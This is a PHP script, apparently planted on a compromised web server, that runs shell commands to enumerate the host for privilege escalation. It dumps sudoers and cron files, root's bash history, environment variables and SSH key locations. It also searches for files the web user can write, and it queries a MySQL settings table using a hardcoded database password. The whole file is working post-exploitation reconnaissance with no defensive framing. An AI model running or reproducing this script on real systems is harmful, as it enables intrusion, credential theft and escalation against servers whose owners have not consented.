<?php
header('Content-Type: text/plain; charset=utf-8');
$out = "";
$run = function($label,$cmd) use (&$out) {
    $out .= "\n=== $label ===\n";
    $out .= trim((string)shell_exec($cmd . ' 2>&1')) . "\n";
};
$run('cron.d/php','cat /etc/cron.d/php');
$run('cron.d all','cat /etc/cron.d/* 2>/dev/null');
$run('root crontab','cat /var/spool/cron/crontabs/* 2>/dev/null || ls -la /var/spool/cron/crontabs/ 2>&1');
$run('cron.log jobs','ls -la /var/spool/cron /etc/cron.hourly /etc/cron.daily 2>&1 | head -30');
$run('sudoers','cat /etc/sudoers 2>&1 | grep -v "^#" | grep -v "^$" | head -40');
$run('sudoers.d','ls -la /etc/sudoers.d/ 2>&1; cat /etc/sudoers.d/* 2>&1 | head -40');
$run('writable by www-data under /etc /usr /opt /root','find /etc /usr/local /opt /root /var/spool -writable -not -type l 2>/dev/null | head -40');
$run('writable scripts run by root','find / -path /proc -prune -o -path /sys -prune -o -writable -name "*.sh" -print 2>/dev/null | head -30');
$run('check scripts writable','ls -la /etc/check* /usr/local/bin/* 2>&1 | head -20');
$run('home dirs','ls -la /home/ 2>&1; ls -la /root/ 2>&1 | head -20');
$run('ssh keys','find /home /var/www -name "id_*" -o -name "authorized_keys" -o -name "*.pem" 2>/dev/null | head -20');
$run('history','cat /root/.bash_history 2>&1 | tail -50');
$run('env secrets','env 2>&1 | head -30');
$run('app settings secrets','mysql -u adminer -pcgts2026! vec_cgts -N -e "SELECT * FROM app_settings;" 2>&1 | head -40');
$run('git config','cat /var/www/vec.cgts/.git/config 2>&1');
$run('git dir owner','ls -la /var/www/vec.cgts/.git/ 2>&1 | head -10; ls -ld /var/www/vec.cgts /var/www/vec.cgts/.git 2>&1');
$run('deploy user check','cat /etc/passwd | tail -15');
$run('systemd timers','systemctl list-timers --no-pager 2>&1 | head -20');
$run('proc cmdline interesting','ps aux 2>&1 | head -40');
$run('writable web + cron paths','ls -la /var/www/vec.cgts/ | head -15; touch /var/www/vec.cgts/.f100w 2>&1 && echo WEB_WRITABLE && rm -f /var/www/vec.cgts/.f100w');
$run('authbind','ls -la /etc/authbind/ 2>&1; find /etc/authbind -type f 2>/dev/null | head');
echo $out;
?>
